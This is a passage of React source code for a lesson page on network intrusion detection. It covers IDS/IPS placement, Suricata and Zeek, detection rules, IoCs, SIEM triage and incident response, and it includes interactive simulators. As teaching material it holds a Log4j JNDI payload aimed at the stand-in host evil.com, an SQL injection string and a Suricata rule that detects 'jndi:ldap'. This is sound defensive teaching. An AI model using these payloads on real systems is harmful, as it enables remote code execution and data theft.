                      <td className="p-3">Detect, record telemetry, and alert</td>
                      <td className="p-3">Detect and actively prevent / drop</td>
                    </tr>
                    <tr>
                      <td className="p-3 font-semibold">Network Placement</td>
                      <td className="p-3">Out-of-band switch mirror or TAP</td>
                      <td className="p-3">Inline forwarding path (bump-in-the-wire)</td>
                    </tr>
                    <tr>
                      <td className="p-3 font-semibold">Traffic Blocking</td>
                      <td className="p-3">Not possible inline (reactive RST only)</td>
                      <td className="p-3 font-bold text-emerald-700">Direct hardware packet drop</td>
                    </tr>
                    <tr>
                      <td className="p-3 font-semibold">Primary Failure Risk</td>
                      <td className="p-3">Alert overload &amp; missed attacks</td>
                      <td className="p-3 font-bold text-rose-700">False positives causing production service outages</td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>

            {/* 20.2 Detection Strategies */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                  SECTION 20.2
                </span>
                <span className="text-xs font-semibold text-stone-700">Detection Science</span>
              </div>
              <h2 className="text-2xl font-bold text-stone-900 mb-4">
                20.2 Detection Strategies: Signature, Anomaly, Behavior, and Policy
              </h2>
              <p className="text-stone-700 leading-relaxed mb-4">
                A resilient threat detection architecture does not rely on a single mechanism. High-performing SOCs blend four complementary detection strategies:
              </p>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 my-5">
                <div className="p-4 rounded-2xl bg-[#f6f4ee] border border-stone-200">
                  <div className="text-xs font-mono font-bold text-purple-700 mb-1">1. SIGNATURE-BASED</div>
                  <h4 className="font-bold text-stone-900 text-sm mb-1">Deterministic Pattern Matching</h4>
                  <p className="text-xs text-stone-600 leading-relaxed mb-2">
                    Matches observed bytes or protocol sequences against explicit known indicators (e.g. Log4j <code>jndi:ldap</code>, Cobalt Strike default named pipes).
                  </p>
                  <span className="text-[10px] text-stone-700 font-mono">High Precision · Vulnerable to encoding/zero-days</span>
                </div>

                <div className="p-4 rounded-2xl bg-[#f6f4ee] border border-stone-200">
                  <div className="text-xs font-mono font-bold text-blue-700 mb-1">2. ANOMALY-BASED</div>
                  <h4 className="font-bold text-stone-900 text-sm mb-1">Statistical Baseline Deviation</h4>
                  <p className="text-xs text-stone-600 leading-relaxed mb-2">
                    Establishes historical baseline metrics (e.g. mean DNS query volume &plusmn; 3 standard deviations). Flags sudden departures from expected parameters.
                  </p>
                  <span className="text-[10px] text-stone-700 font-mono">Catches novel attacks · Susceptible to maintenance false alarms</span>
                </div>

                <div className="p-4 rounded-2xl bg-[#f6f4ee] border border-stone-200">
                  <div className="text-xs font-mono font-bold text-emerald-700 mb-1">3. BEHAVIOR-BASED</div>
                  <h4 className="font-bold text-stone-900 text-sm mb-1">Multi-Stage State Machine Sequences</h4>
                  <p className="text-xs text-stone-600 leading-relaxed mb-2">
                    Evaluates multi-event causal sequences (e.g., rapid port sweep followed by successful SSH login, immediately followed by an outbound connection on port 4444).
                  </p>
                  <span className="text-[10px] text-stone-700 font-mono">Context-aware · High confidence on complex attacks</span>
                </div>

                <div className="p-4 rounded-2xl bg-[#f6f4ee] border border-stone-200">
                  <div className="text-xs font-mono font-bold text-orange-700 mb-1">4. POLICY-BASED</div>
                  <h4 className="font-bold text-stone-900 text-sm mb-1">Approved Network Boundary Enforcement</h4>
                  <p className="text-xs text-stone-600 leading-relaxed mb-2">
                    Enforces enterprise structural constraints (e.g. IoT building sensors communicating directly with database servers, or cleartext HTTP on administrative subnets).
                  </p>
                  <span className="text-[10px] text-stone-700 font-mono">Zero Trust enforcement · Low false positive rate</span>
                </div>
              </div>
            </div>

            {/* 20.3 Suricata and Snort 3 Engines */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                  SECTION 20.3
                </span>
                <span className="text-xs font-semibold text-stone-700">Sensor Internals</span>
              </div>
              <h2 className="text-2xl font-bold text-stone-900 mb-4">
                20.3 Suricata and Snort 3 Detection Engine Architecture
              </h2>
              <p className="text-stone-700 leading-relaxed mb-4">
                Both Suricata and Snort 3 follow a multi-threaded, high-throughput pipeline designed to ingest multi-gigabit traffic streams with low latency:
              </p>

              <div className="p-5 rounded-2xl bg-stone-950 text-stone-200 font-mono text-xs my-5 overflow-x-auto">
                <div className="text-stone-400 mb-3">// 5-Stage Packet Processing Pipeline</div>
                <div className="space-y-2">
                  <div>1. <span className="text-orange-400 font-bold">Packet Acquisition:</span> AF_PACKET, DPDK, or PF_RING captures frames with zero-copy ring buffers.</div>
                  <div>2. <span className="text-blue-400 font-bold">Protocol Decoding:</span> Parses Ethernet, 802.1Q, IPv4/IPv6, TCP/UDP headers and performs TCP flow stream reassembly.</div>
                  <div>3. <span className="text-purple-400 font-bold">App-Layer Parsers:</span> Decodes application protocols (HTTP, TLS, DNS, SSH, SMB, DCERPC) into structured metadata buffers.</div>
                  <div>4. <span className="text-emerald-400 font-bold">Detection Engine:</span> Evaluates multi-pattern search algorithms (Aho-Corasick) to match thousands of rule fast-patterns simultaneously.</div>
                  <div>5. <span className="text-rose-400 font-bold">Action &amp; Output:</span> Drops/rejects matching frames (if inline) and logs structured JSON events to <code>eve.json</code>.</div>
                </div>
              </div>

              <p className="text-stone-700 text-sm leading-relaxed">
                Suricata provides native multithreading across CPU cores and outputs structured <strong>EVE JSON</strong> (Extensible Event Format), enabling seamless ingestion into SIEM tools like Elasticsearch, Splunk, and OpenSearch.
              </p>
            </div>

            {/* 20.4 Anatomy of Detection Rules */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                  SECTION 20.4
                </span>
                <span className="text-xs font-semibold text-stone-700">Detection Engineering</span>
              </div>
              <h2 className="text-2xl font-bold text-stone-900 mb-4">
                20.4 Anatomy of a Detection Rule: Header, Flow, and Modifiers
              </h2>
              <p className="text-stone-700 leading-relaxed mb-4">
                A rule is divided into two distinct components: the <strong>Rule Header</strong> (which defines who and what to inspect) and the <strong>Rule Options</strong> enclosed in parentheses (which define exact match criteria, metadata, and alert IDs):
              </p>

              <div className="p-4 bg-stone-900 text-stone-100 rounded-2xl font-mono text-xs my-4 leading-relaxed overflow-x-auto">
                <span className="text-rose-400 font-bold">alert</span> <span className="text-blue-400">tcp</span> <span className="text-emerald-400">$EXTERNAL_NET</span> any <span className="text-stone-400">-&gt;</span> <span className="text-emerald-400">$HOME_NET</span> 80 ( <br />
                &nbsp;&nbsp;msg:<span className="text-amber-300">&quot;ET EXPLOIT Apache Log4j RCE Attempt (CVE-2021-44228)&quot;</span>;<br />
                &nbsp;&nbsp;flow:to_server,established;<br />
                &nbsp;&nbsp;content:<span className="text-amber-300">&quot;jndi:ldap&quot;</span>; nocase; fast_pattern;<br />
                &nbsp;&nbsp;classtype:attempted-admin;<br />
                &nbsp;&nbsp;sid:<span className="text-purple-400">2034001</span>; rev:<span className="text-purple-400">1</span>;<br />
                )
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 text-xs font-mono my-4">
                <div className="p-3 bg-[#f6f4ee] rounded-xl border border-stone-200">
                  <span className="text-[#ea580c] font-bold block mb-1">flow:established,to_server</span>
                  <span className="text-stone-600 font-sans">Requires completed TCP 3-way handshake before inspecting payload, avoiding noise from blind SYN probes.</span>
                </div>
                <div className="p-3 bg-[#f6f4ee] rounded-xl border border-stone-200">
                  <span className="text-[#ea580c] font-bold block mb-1">nocase &amp; fast_pattern</span>
                  <span className="text-stone-600 font-sans">Performs case-insensitive matching and designates the string for pre-filtering in the Aho-Corasick matrix.</span>
                </div>
                <div className="p-3 bg-[#f6f4ee] rounded-xl border border-stone-200">
                  <span className="text-[#ea580c] font-bold block mb-1">sid &amp; rev</span>
                  <span className="text-stone-600 font-sans">Signature ID (&gt;1,000,000 for local custom rules) and revision number for change management.</span>
                </div>
              </div>
            </div>

            {/* 20.5 Zeek Network Telemetry */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                  SECTION 20.5
                </span>
                <span className="text-xs font-semibold text-stone-700">Network Telemetry Engine</span>
              </div>
              <h2 className="text-2xl font-bold text-stone-900 mb-4">
                20.5 Zeek Network Telemetry &amp; Protocol Log Architecture
              </h2>
              <p className="text-stone-700 leading-relaxed mb-4">
                Unlike Suricata, which is optimized to trigger alerts on matching signatures, <strong>Zeek</strong> is a stateful protocol analysis framework. It silently records every observed conversation, transaction, DNS resolution, and certificate handshake into clean, structured, tab-separated or JSON logs:
              </p>

              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 my-5">
                <div className="p-4 rounded-2xl bg-[#f6f4ee] border border-stone-200">
                  <h4 className="font-bold text-stone-900 font-mono text-xs mb-1">conn.log</h4>
                  <p className="text-xs text-stone-600 leading-relaxed">
                    Every TCP/UDP/ICMP connection: endpoints, duration, bytes in/out, protocol, service, and connection state (e.g. <code>SF</code> for normal completion, <code>S0</code> for unanswered probe).
                  </p>
                </div>
                <div className="p-4 rounded-2xl bg-[#f6f4ee] border border-stone-200">
                  <h4 className="font-bold text-stone-900 font-mono text-xs mb-1">dns.log</h4>
                  <p className="text-xs text-stone-600 leading-relaxed">
                    Every DNS query, response code (<code>NOERROR</code>, <code>NXDOMAIN</code>), query type (A, AAAA, TXT), TTL, and returned IP address answers.
                  </p>
                </div>
                <div className="p-4 rounded-2xl bg-[#f6f4ee] border border-stone-200">
                  <h4 className="font-bold text-stone-900 font-mono text-xs mb-1">http.log / ssl.log</h4>
                  <p className="text-xs text-stone-600 leading-relaxed">
                    Decoded HTTP methods, URIs, User-Agents, status codes, and TLS certificate SNI, issuer, cipher suites, and validation states.
                  </p>
                </div>
              </div>

              <div className="p-4 rounded-2xl bg-stone-900 text-stone-200 font-mono text-xs overflow-x-auto">
                <div className="text-stone-400 mb-2">// Querying Zeek Logs with zeek-cut:</div>
                <div className="text-emerald-400">zeek-cut ts id.orig_h id.resp_h id.resp_p proto service conn_state &lt; conn.log | head -n 5</div>
                <div className="text-stone-400 mt-2 text-[11px]">
                  1697380102.110 &nbsp;10.0.1.45 &nbsp;198.51.100.88 &nbsp;80 &nbsp;tcp &nbsp;http &nbsp;SF<br />
                  1697380110.002 &nbsp;10.0.1.45 &nbsp;198.51.100.99 &nbsp;4444 &nbsp;tcp &nbsp;- &nbsp;&nbsp;&nbsp;SF
                </div>
              </div>
            </div>

            {/* 20.6 Zeek and Suricata Complementary Fusion */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                  SECTION 20.6
                </span>
                <span className="text-xs font-semibold text-stone-700">Sensor Fusion</span>
              </div>
              <h2 className="text-2xl font-bold text-stone-900 mb-4">
                20.6 Suricata &amp; Zeek Sensor Fusion: The Detection &amp; Context Pipeline
              </h2>
              <p className="text-stone-700 leading-relaxed mb-4">
                Suricata and Zeek are not competitors; they are complementary halves of a modern Network Security Monitoring (NSM) sensor:
              </p>
              <div className="p-5 rounded-2xl bg-[#f6f4ee] border border-stone-200 text-xs text-stone-700 leading-relaxed space-y-3">
                <div className="flex items-start gap-3">
                  <ShieldAlert className="text-rose-600 shrink-0 mt-0.5" size={16} />
                  <div>
                    <strong>Suricata provides the ALARM:</strong> <em>&quot;At 14:15:02 UTC, host 10.0.1.45 sent a known Log4j exploit payload to 198.51.100.88 (Rule SID 2034001).&quot;</em>
                  </div>
                </div>
                <div className="flex items-start gap-3">
                  <Activity className="text-blue-600 shrink-0 mt-0.5" size={16} />
                  <div>
                    <strong>Zeek provides the SURROUNDING CONTEXT:</strong> <em>&quot;Host 10.0.1.45 has been online for 4 hours; 6 seconds after the Suricata alert, it resolved a dynamic DNS domain in dns.log, and opened a persistent TCP connection in conn.log that transmitted 14.2 MB over 30 minutes.&quot;</em>
                  </div>
                </div>
              </div>
            </div>

            {/* 20.7 Indicators of Compromise & Correlation */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                  SECTION 20.7
                </span>
                <span className="text-xs font-semibold text-stone-700">Threat Intelligence</span>
              </div>
              <h2 className="text-2xl font-bold text-stone-900 mb-4">
                20.7 Indicators of Compromise (IoCs) &amp; Multi-Source Event Correlation
              </h2>
              <p className="text-stone-700 leading-relaxed mb-4">
                An <strong>Indicator of Compromise (IoC)</strong> is an observable digital artifact suggesting malicious activity. According to David Bianco&apos;s <em>Pyramid of Pain</em>, indicators vary dramatically in how difficult they are for an adversary to modify:
              </p>

              <div className="space-y-2 my-4 text-xs font-mono">
                <div className="p-2.5 rounded-xl bg-stone-100 border border-stone-200 flex justify-between items-center">
                  <span>Hash Values (SHA-256, MD5)</span>
                  <span className="text-stone-700">Trivial for attacker to change (1 bit change = new hash)</span>
                </div>
                <div className="p-2.5 rounded-xl bg-stone-100 border border-stone-200 flex justify-between items-center">
                  <span>IP Addresses &amp; Domain Names</span>
                  <span className="text-stone-700">Simple to change (Fast-flux, dynamic DNS, VPS hops)</span>
                </div>
                <div className="p-2.5 rounded-xl bg-amber-50 border border-amber-200 flex justify-between items-center text-amber-900 font-bold">
                  <span>Network / Host Artifacts (User-Agents, C2 URIs)</span>
                  <span>Annoying to rewrite in tools</span>
                </div>
                <div className="p-2.5 rounded-xl bg-orange-50 border border-orange-200 flex justify-between items-center text-orange-950 font-bold">
                  <span>Tools (Cobalt Strike, Mimikatz, Metasploit)</span>
                  <span>Challenging to rebuild custom alternatives</span>
                </div>
                <div className="p-2.5 rounded-xl bg-rose-100 border border-rose-300 flex justify-between items-center text-rose-950 font-bold">
                  <span>TTPs (Tactics, Techniques &amp; Procedures)</span>
                  <span>Tough! Disrupts adversary behavior and playbook</span>
                </div>
              </div>
            </div>

            {/* 20.8 SIEM Integration & Alert Triage */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                  SECTION 20.8
                </span>
                <span className="text-xs font-semibold text-stone-700">SOC Operations</span>
              </div>
              <h2 className="text-2xl font-bold text-stone-900 mb-4">
                20.8 SIEM Ingestion, Normalization, Enrichment, and Alert Triage
              </h2>
              <p className="text-stone-700 leading-relaxed mb-4">
                A Security Information and Event Management (SIEM) platform centralizes security telemetry across thousands of endpoints and sensors through a standardized ingestion pipeline:
              </p>

              <div className="grid grid-cols-1 md:grid-cols-4 gap-3 my-5 text-xs">
                <div className="p-3 bg-[#f6f4ee] rounded-xl border border-stone-200">
                  <span className="font-bold text-[#ea580c] block mb-1">1. Normalization</span>
                  <p className="text-stone-600">Maps disparate sensor fields into a common schema (e.g. Elastic Common Schema ECS, Splunk CIM).</p>
                </div>
                <div className="p-3 bg-[#f6f4ee] rounded-xl border border-stone-200">
                  <span className="font-bold text-[#ea580c] block mb-1">2. Enrichment</span>
                  <p className="text-stone-600">Appends CMDB asset criticality (Tier 1 vs Guest), GeoIP location, and threat intel reputation.</p>
                </div>
                <div className="p-3 bg-[#f6f4ee] rounded-xl border border-stone-200">
                  <span className="font-bold text-[#ea580c] block mb-1">3. Correlation</span>
                  <p className="text-stone-600">Aggregates related alerts across time windows to generate unified incident cases.</p>
                </div>
                <div className="p-3 bg-[#f6f4ee] rounded-xl border border-stone-200">
                  <span className="font-bold text-[#ea580c] block mb-1">4. Triage</span>
                  <p className="text-stone-600">Assesses Severity vs. Confidence to prioritize analyst response without alert fatigue.</p>
                </div>
              </div>
            </div>

            {/* 20.9 Incident Containment & Recovery */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                  SECTION 20.9
                </span>
                <span className="text-xs font-semibold text-stone-700">Incident Response</span>
              </div>
              <h2 className="text-2xl font-bold text-stone-900 mb-4">
                20.9 NIST SP 800-61 Incident Containment, Evidence Collection &amp; Recovery
              </h2>
              <p className="text-stone-700 leading-relaxed mb-4">
                Incident response must follow disciplined operational governance. The NIST SP 800-61 Rev 3 framework defines a continuous lifecycle:
              </p>

              <div className="p-5 rounded-2xl bg-[#f6f4ee] border border-stone-200 space-y-3 text-xs text-stone-700 leading-relaxed">
                <div>
                  <strong className="text-stone-900">Containment Strategy Decisions:</strong> Prior to isolating a host or executing firewall shuns, the analyst must evaluate:
                  <ul className="list-disc pl-5 mt-1 space-y-1">
                    <li>Is the threat verified, or is there a possibility of an operational false positive?</li>
                    <li>Is the affected asset mission-critical (e.g. Core Database vs individual kiosk)?</li>
                    <li>Will containment destroy volatile evidence in RAM (e.g. rebooting before memory acquisition)?</li>
                    <li>Is the containment action reversible and authorized under the approved incident response policy?</li>
                  </ul>
                </div>
              </div>
            </div>

            {/* 20.10 Detection Quality Engineering */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                  SECTION 20.10
                </span>
                <span className="text-xs font-semibold text-stone-700">Metrics &amp; Tuning</span>
              </div>
              <h2 className="text-2xl font-bold text-stone-900 mb-4">
                20.10 Detection Quality Engineering: Precision, Recall, and Rule Tuning
              </h2>
              <p className="text-stone-700 leading-relaxed mb-4">
                A rule that triggers 1,000 alerts per hour causes severe analyst burnout and leads to genuine attacks being overlooked. Detection engineers evaluate detectors using formal statistical metrics:
              </p>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 my-5 text-xs font-mono">
                <div className="p-4 rounded-2xl bg-[#f6f4ee] border border-stone-200">
                  <span className="text-stone-700 font-bold block mb-1">PRECISION</span>
                  <div className="text-sm font-bold text-stone-900 mb-1">TP / (TP + FP)</div>
                  <span className="text-stone-600 font-sans">Measures how many triggered alerts are genuinely malicious. Low precision = alert fatigue!</span>
                </div>
                <div className="p-4 rounded-2xl bg-[#f6f4ee] border border-stone-200">
                  <span className="text-stone-700 font-bold block mb-1">RECALL (SENSITIVITY)</span>
                  <div className="text-sm font-bold text-stone-900 mb-1">TP / (TP + FN)</div>
                  <span className="text-stone-600 font-sans">Measures what percentage of actual attacks were caught. Low recall = missed breaches!</span>
                </div>
                <div className="p-4 rounded-2xl bg-[#f6f4ee] border border-stone-200">
                  <span className="text-stone-700 font-bold block mb-1">F1-SCORE</span>
                  <div className="text-sm font-bold text-stone-900 mb-1">2 &times; (P &times; R) / (P + R)</div>
                  <span className="text-stone-600 font-sans">The harmonic mean balancing precision and recall into a single score.</span>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* TAB 2: INTERACTIVE SIMULATORS */}
        {activeTab === "simulators" && (
          <div className="space-y-10">
            {/* SIMULATOR 1: Inline IPS vs Passive IDS */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm">
              <div className="flex flex-wrap items-center justify-between gap-3 mb-4 pb-4 border-b border-stone-200">
                <div>
                  <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                    SIMULATOR 1
                  </span>
                  <h3 className="text-xl font-bold text-stone-900 mt-2">
                    Inline IPS vs. Passive IDS Traffic Interception Sandbox
                  </h3>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
                <div className="space-y-4">
                  <div>
                    <label className="text-xs font-bold text-stone-700 block mb-1">
                      Sensor Deployment Architecture:
                    </label>
                    <div className="grid grid-cols-2 gap-2">
                      <button
                        onClick={() => setSensorDeployment("passive")}
                        className={`py-2 rounded-xl text-xs font-bold transition cursor-pointer ${
                          sensorDeployment === "passive"
                            ? "bg-[#ea580c] text-white shadow-sm"
                            : "bg-stone-100 text-stone-700 hover:bg-stone-200"
                        }`}
                      >
                        Passive IDS (TAP)
                      </button>
                      <button
                        onClick={() => setSensorDeployment("inline")}
                        className={`py-2 rounded-xl text-xs font-bold transition cursor-pointer ${
                          sensorDeployment === "inline"
                            ? "bg-[#ea580c] text-white shadow-sm"
                            : "bg-stone-100 text-stone-700 hover:bg-stone-200"
                        }`}
                      >
                        Inline IPS (Bridge)
                      </button>
                    </div>
                  </div>

                  {sensorDeployment === "inline" && (
                    <div>
                      <label className="text-xs font-bold text-stone-700 block mb-1">
                        Hardware Bypass State:
                      </label>
                      <select
                        value={bypassMode}
                        onChange={(e) => setBypassMode(e.target.value)}
                        className="w-full text-xs font-semibold p-2 rounded-xl border border-stone-300 bg-white"
                      >
                        <option value="normal">Normal (Active Inline Filtering)</option>
                        <option value="fail-open">Fail-Open Bypass (Relay passes all traffic)</option>
                        <option value="fail-closed">Fail-Closed Relay (Relay drops all traffic)</option>
                      </select>
                    </div>
                  )}

                  <div>
                    <label className="text-xs font-bold text-stone-700 block mb-1">
                      Ingress Packet Payload Stream:
                    </label>
                    <select
                      value={trafficPayload}
                      onChange={(e) => setTrafficPayload(e.target.value)}
                      className="w-full text-xs font-semibold p-2.5 rounded-xl border border-stone-300 bg-white"
                    >
                      <option value="clean-web">Benign HTTP GET /index.html (Clean)</option>
                      <option value="port-scan">Horizontal SYN Port Scan (Ports 21-445)</option>
                      <option value="log4j">Log4j RCE (${"${"}jndi:ldap://evil.com/a{"}"})</option>
                      <option value="sqli">SQLi Payload (&apos; OR 1=1 UNION SELECT--)</option>
                    </select>
                  </div>

                  <button
                    onClick={runInterceptionSimulation}
                    className="w-full py-2.5 bg-stone-900 hover:bg-[#ea580c] text-white rounded-xl text-xs font-bold transition cursor-pointer flex items-center justify-center gap-2"
                  >
                    <Play size={14} />
                    Transmit Packet Stream Through Sensor
                  </button>
                </div>

                <div className="md:col-span-2 p-5 rounded-2xl bg-[#f6f4ee] border border-stone-200">
                  <div className="text-xs font-bold text-stone-800 mb-3">SENSOR HARDWARE &amp; TRAFFIC OUTCOME:</div>
                  {simRunResult ? (
                    <div className="space-y-3 font-mono text-xs">
                      <div className="grid grid-cols-2 gap-3">
                        <div className="p-3 bg-white rounded-xl border border-stone-200">
                          <span className="text-[10px] text-stone-700 block">DESTINATION SERVER RECEIPT:</span>
                          <span
                            className={`font-bold ${
                              simRunResult.trafficColor === "emerald"
                                ? "text-emerald-600"
                                : simRunResult.trafficColor === "rose"
                                ? "text-rose-600"
                                : "text-amber-600"
                            }`}
                          >
                            {simRunResult.trafficStatus}
                          </span>
                        </div>
                        <div className="p-3 bg-white rounded-xl border border-stone-200">
                          <span className="text-[10px] text-stone-700 block">SENSOR ACTION:</span>
                          <span
                            className={`font-bold ${
                              simRunResult.alertColor === "rose"
                                ? "text-rose-600"
                                : simRunResult.alertColor === "emerald"
                                ? "text-emerald-600"
                                : simRunResult.alertColor === "amber"
                                ? "text-amber-600"
                                : "text-stone-700"
                            }`}
                          >
                            {simRunResult.sensorAction}
                          </span>
                        </div>
                      </div>

                      <div className="p-3 bg-white rounded-xl border border-stone-200 font-sans text-xs text-stone-800">
                        {simRunResult.explanation}
                      </div>

                      {simRunResult.rawEvent && (
                        <div className="p-3 bg-stone-950 text-stone-300 rounded-xl border border-stone-800 text-[11px] leading-relaxed overflow-x-auto whitespace-pre-wrap">
                          <span className="text-stone-700 block mb-1">// Structured Suricata eve.json Event:</span>
                          {simRunResult.rawEvent}
                        </div>
                      )}
                    </div>
                  ) : (
                    <div className="p-8 rounded-xl border border-dashed border-stone-300 text-center text-xs text-stone-700 font-mono">
                      Select deployment mode, payload, and click &quot;Transmit Packet Stream&quot;.
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* SIMULATOR 2: Rule Builder & Regex Matcher */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm">
              <div className="flex flex-wrap items-center justify-between gap-3 mb-4 pb-4 border-b border-stone-200">
                <div>
                  <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                    SIMULATOR 2
                  </span>
                  <h3 className="text-xl font-bold text-stone-900 mt-2">
                    Suricata &amp; Snort 3 Detection Rule Builder &amp; Fast-Pattern Matcher
                  </h3>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
                <div className="space-y-3">
                  <div>
                    <label className="text-xs font-bold text-stone-700 block mb-1">Rule Action:</label>
                    <div className="grid grid-cols-3 gap-2">
                      {["alert", "drop", "pass"].map((act) => (
                        <button
                          key={act}
                          onClick={() => setRuleAction(act)}
                          className={`py-1.5 rounded-xl text-xs font-bold uppercase transition cursor-pointer ${
                            ruleAction === act ? "bg-[#ea580c] text-white" : "bg-stone-100 text-stone-700 hover:bg-stone-200"
                          }`}
                        >
                          {act}
                        </button>
                      ))}
                    </div>
                  </div>

                  <div>
                    <label className="text-xs font-bold text-stone-700 block mb-1">Protocol:</label>
                    <select
                      value={ruleProto}
                      onChange={(e) => setRuleProto(e.target.value)}
                      className="w-full text-xs font-semibold p-2 rounded-xl border border-stone-300 bg-white"
                    >
                      <option value="http">http (Decoded HTTP Layer)</option>
                      <option value="tcp">tcp (Raw TCP Stream)</option>
                      <option value="dns">dns (DNS Transactions)</option>
                    </select>
                  </div>

                  <div>
                    <label className="text-xs font-bold text-stone-700 block mb-1">Match Content Substring:</label>
                    <input
                      type="text"
                      value={ruleContent}
                      onChange={(e) => setRuleContent(e.target.value)}
                      className="w-full text-xs font-mono p-2 rounded-xl border border-stone-300 bg-white"
                    />
                  </div>

                  <div className="flex items-center gap-2">
                    <input
                      type="checkbox"
                      id="nocaseCheck"
                      checked={ruleNocase}
                      onChange={(e) => setRuleNocase(e.target.checked)}
                      className="accent-orange-600 cursor-pointer"
                    />
                    <label htmlFor="nocaseCheck" className="text-xs font-bold text-stone-700 cursor-pointer">
                      Enable nocase (Case-insensitive)
                    </label>
                  </div>

                  <div>
                    <label className="text-xs font-bold text-stone-700 block mb-1">Rule Message:</label>
                    <input
                      type="text"
                      value={ruleMsg}
                      onChange={(e) => setRuleMsg(e.target.value)}
                      className="w-full text-xs p-2 rounded-xl border border-stone-300 bg-white"
                    />
                  </div>
                </div>

                <div className="md:col-span-2 space-y-4">
                  <div>
                    <div className="text-xs font-bold text-stone-800 mb-1">GENERATED SURICATA / SNORT 3 RULE:</div>
                    <pre className="p-3 bg-stone-950 text-emerald-400 rounded-xl font-mono text-xs overflow-x-auto whitespace-pre-wrap">
                      {ruleCode}
                    </pre>
                  </div>

                  <div>
                    <div className="text-xs font-bold text-stone-800 mb-1">TEST INGRESS PACKET PAYLOAD:</div>
                    <textarea
                      value={testPayloadText}
                      onChange={(e) => setTestPayloadText(e.target.value)}
                      rows={3}
                      className="w-full p-2.5 rounded-xl border border-stone-300 font-mono text-xs bg-white"
                      placeholder="Paste packet raw payload here..."
                    />
                  </div>

                  <div
                    className={`p-4 rounded-xl border text-xs font-mono flex items-center justify-between ${
                      ruleMatchEvaluation.color === "rose"
                        ? "bg-rose-50 border-rose-300 text-rose-950"
                        : ruleMatchEvaluation.color === "amber"
                        ? "bg-amber-50 border-amber-300 text-amber-950"
                        : "bg-stone-100 border-stone-300 text-stone-700"
                    }`}
                  >
                    <div>
                      <span className="font-bold block text-sm">{ruleMatchEvaluation.actionTaken}</span>
                      <span className="text-xs opacity-90">{ruleMatchEvaluation.reason}</span>
                    </div>
                    <span className="px-3 py-1 rounded-full text-xs font-bold bg-white border border-current">
                      {ruleMatchEvaluation.matched ? "SIGNATURE MATCH" : "PASSED"}
                    </span>
                  </div>
                </div>
              </div>
            </div>

            {/* SIMULATOR 3: Zeek Telemetry & Multi-Log Correlation */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-[#e7e3da] shadow-sm">
              <div className="flex flex-wrap items-center justify-between gap-3 mb-4 pb-4 border-b border-stone-200">
                <div>
                  <span className="text-xs font-mono font-bold text-[#ea580c] bg-orange-50 px-2.5 py-1 rounded-md border border-orange-200">
                    SIMULATOR 3
                  </span>
                  <h3 className="text-xl font-bold text-stone-900 mt-2">
                    Zeek Telemetry &amp; Multi-Log Cross-Correlation Engine
                  </h3>
                </div>

                <div className="flex items-center gap-2">
                  <span className="text-xs font-bold text-stone-700">Filter by Connection UID:</span>
                  <select
                    value={zeekFilterUid}
                    onChange={(e) => setZeekFilterUid(e.target.value)}
                    className="text-xs font-mono font-bold p-1.5 rounded-xl border border-stone-300 bg-white"
                  >
                    <option value="ALL">Show All UIDs</option>
                    <option value="C6p0m21xZf9">UID: C6p0m21xZf9 (HTTP Exploit)</option>
                    <option value="Cy8kP34bRt2">UID: Cy8kP34bRt2 (DNS Lookup)</option>
                    <option value="Cw1nL88aQq9">UID: Cw1nL88aQq9 (C2 Exfiltration)</option>
                  </select>
                </div>
              </div>

              {/* Log Tabs / Sections */}
              <div className="space-y-4">
